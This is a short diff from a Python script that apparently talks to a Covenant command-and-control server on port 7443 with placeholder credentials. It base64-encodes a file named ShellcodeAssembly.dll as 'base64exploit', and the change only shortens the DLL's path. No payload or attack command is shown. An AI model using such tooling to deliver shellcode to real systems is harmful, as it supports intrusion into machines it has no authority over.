@@ -10,7 +10,7 @@ COVENANT_PORT = 7443
 USERNAME = "bla"
 PASSWORD = "bla"
 
-with open('./ShellcodeAssembly/ShellcodeAssembly/bin/Release/ShellcodeAssembly.dll', 'rb') as f:
+with open('./ShellcodeAssembly.dll', 'rb') as f:
     base64exploit = base64.b64encode(f.read()).decode()
 
 url = f"https://{SERVER_URL}:{COVENANT_PORT}"
